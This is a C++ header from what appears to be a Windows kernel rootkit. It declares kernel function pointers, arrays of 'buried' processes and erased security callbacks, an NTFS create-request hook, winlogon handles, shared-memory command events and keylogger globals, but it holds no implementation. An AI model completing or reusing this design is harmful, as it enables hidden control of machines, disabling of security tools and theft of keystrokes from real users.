#pragma once

#include <ntifs.h>
#include <ntddk.h>
#include <wdf.h>
#include "WinTypes.hpp"
#include "Vector.hpp"
#include "AutoLock.hpp"
#include "Debug.hpp"

//
// Function Prototypes
//
typedef NTSTATUS(*IOCREATEDRIVER)(IN PUNICODE_STRING DriverName, IN PDRIVER_INITIALIZE InitializationFunction);
typedef NTSTATUS(*ZWTERMINATEPROCESS)(IN HANDLE ProcessHandle OPTIONAL, IN NTSTATUS ExitStatus);
typedef NTSTATUS(*ZWOPENPROCESS)(OUT PHANDLE ProcessHandle, IN ACCESS_MASK DesiredAccess, IN POBJECT_ATTRIBUTES ObjectAttributes, IN PCLIENT_ID ClientId);
typedef NTSTATUS(*ZWCLOSE)(IN HANDLE Handle);
typedef NTSTATUS(*ZWPROTECTVIRTUALMEMORY)(IN HANDLE ProcessHandle, IN OUT PVOID* BaseAddress, IN OUT PSIZE_T RegionSize, IN ULONG NewProtect, OUT PULONG OldProtect);
typedef NTSTATUS(*MMCOPYVIRTUALMEMORY)(IN PEPROCESS SourceProcess, IN PVOID SourceAddress, IN PEPROCESS TargetProcess, OUT PVOID TargetAddress, IN SIZE_T BufferSize, IN KPROCESSOR_MODE PreviousMode, OUT PSIZE_T ReturnSize);
typedef NTSTATUS(*PSSETCREATEPROCESSNOTIFYROUTINEEX)(IN PCREATE_PROCESS_NOTIFY_ROUTINE_EX NotifyRoutine, IN BOOLEAN Remove);
typedef NTSTATUS(*ZWQUERYSYSTEMINFORMATION)(IN SYSTEM_INFORMATION_CLASS SystemInformationClass, OUT PVOID SystemInformation, IN ULONG SystemInformationLength, OUT PULONG ReturnLength OPTIONAL);
typedef NTSTATUS(*OBREFERENCEOBJECTBYNAME)(PUNICODE_STRING ObjectName, ULONG Attributes, PACCESS_STATE AccessState, ACCESS_MASK DesiredAccess, POBJECT_TYPE ObjectType, KPROCESSOR_MODE AccessMode, PVOID ParseContext, PVOID* Object);
typedef NTSTATUS(*ZWSETEVENT)(IN HANDLE EventHandle, OUT PIO_STATUS_BLOCK IoStatusBlock OPTIONAL);
typedef NTSTATUS(*ZWRESETEVENT)(IN HANDLE EventHandle, OUT PIO_STATUS_BLOCK IoStatusBlock OPTIONAL);
typedef NTSTATUS(*ZWCREATEEVENT)(OUT PHANDLE EventHandle, IN ACCESS_MASK DesiredAccess, IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL, IN EVENT_TYPE EventType, IN BOOLEAN InitialState);
typedef NTSTATUS(*ZWCREATESECTION)(OUT PHANDLE SectionHandle, IN ACCESS_MASK DesiredAccess, IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL, IN PLARGE_INTEGER MaximumSize OPTIONAL, IN ULONG SectionPageProtection, IN ULONG AllocationAttributes, IN HANDLE FileHandle OPTIONAL);
typedef NTSTATUS(*ZWMAPVIEWOFSECTION)(IN HANDLE SectionHandle, IN HANDLE ProcessHandle, OUT PVOID BaseAddress, IN ULONG_PTR ZeroBits, IN SIZE_T CommitSize, IN OUT PLARGE_INTEGER SectionOffset, IN OUT PSIZE_T ViewSize, IN SECTION_INHERIT InheritDisposition, IN ULONG AllocationType, IN ULONG Protect);
typedef NTSTATUS(*ZWUNMAPVIEWOFSECTION)(IN HANDLE ProcessHandle, IN PVOID BaseAddress);
typedef NTSTATUS(*ZWALLOCATEVIRTUALMEMORY)(IN HANDLE ProcessHandle, OUT PVOID BaseAddress, IN ULONG_PTR ZeroBits, OUT PSIZE_T RegionSize, IN ULONG AllocationType, IN ULONG PageProtection);
typedef NTSTATUS(*ZWCREATETHREADEX)(PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, HANDLE ProcessHandle, PVOID StartRoutine, PVOID Argument, SIZE_T CreateFlags, SIZE_T ZeroBits, SIZE_T StackSize, SIZE_T MaximumStackSize, PPS_ATTRIBUTE_LIST AttributeList);

#define MAX_BURIED_PROCESSES 256
#define MAX_ERASE_CALLBACKS 256

typedef struct _WCHAR_ARRAY {
    WCHAR* array[MAX_BURIED_PROCESSES];
    INT length;
} WCHAR_ARRAY;

typedef struct _KERNEL_CALLBACK_RESTORE_INFO_ARRAY {
    LONG64 addrOfCallbackFunction[MAX_ERASE_CALLBACKS];
    LONG64 callbackToRestore[MAX_ERASE_CALLBACKS];
    CALLBACK_TYPE callbackType[MAX_ERASE_CALLBACKS];
    INT length;
} KERNEL_CALLBACK_RESTORE_INFO_ARRAY;

typedef NTSTATUS(NTAPI* NTFS_IRP_MJ_CREATE_FUNCTION)(PDEVICE_OBJECT DeviceObject, PIRP Irp);

#pragma once

namespace BeGlobals {
    extern PVOID NtOsKrnlAddr;
    extern PVOID Win32kBaseAddr;
    extern PDRIVER_OBJECT diskDriverObject;

    extern OBREFERENCEOBJECTBYNAME pObReferenceObjectByName;
    extern ZWQUERYSYSTEMINFORMATION pZwQuerySystemInformation;
    extern ZWTERMINATEPROCESS pZwTerminateProcess;
    extern ZWOPENPROCESS pZwOpenProcess;
    extern ZWCLOSE pZwClose;
    extern ZWPROTECTVIRTUALMEMORY pZwProtectVirtualMemory;
    extern MMCOPYVIRTUALMEMORY pMmCopyVirtualMemory;
    extern PSSETCREATEPROCESSNOTIFYROUTINEEX pPsSetCreateProcessNotifyRoutineEx;
    extern ZWMAPVIEWOFSECTION pZwMapViewOfSection;
    extern ZWCREATESECTION pZwCreateSection;
    extern ZWUNMAPVIEWOFSECTION pZwUnmapViewOfSection;
    extern ZWALLOCATEVIRTUALMEMORY pZwAllocateVirtualMemory;
    extern ZWCREATETHREADEX pZwCreateThreadEx;
    extern ZWCREATEEVENT pZwCreateEvent;
    extern ZWSETEVENT pZwSetEvent;
    extern ZWRESETEVENT pZwResetEvent;

    extern HANDLE winLogonPid;
    extern PEPROCESS winLogonProc;

    extern HANDLE hSharedMemory;
    extern PVOID pSharedMemory;
    extern HANDLE commandEvent;
    extern HANDLE answerEvent;

    extern WCHAR_ARRAY beBuryTargetProcesses;
    extern KERNEL_CALLBACK_RESTORE_INFO_ARRAY BeCallbacksToRestore;

    extern FastMutex ProcessListLock;
    extern FastMutex CallbackLock;

    extern NTFS_IRP_MJ_CREATE_FUNCTION OriginalNTFS_IRP_MJ_CREATE_function;

    extern bool bShutdown;
    extern bool bLogKeys;

    extern KEVENT hKeyLoggerTerminationEvent;
    extern KEVENT hMainLoopTerminationEvent;

    NTSTATUS BeInitGlobals();
}

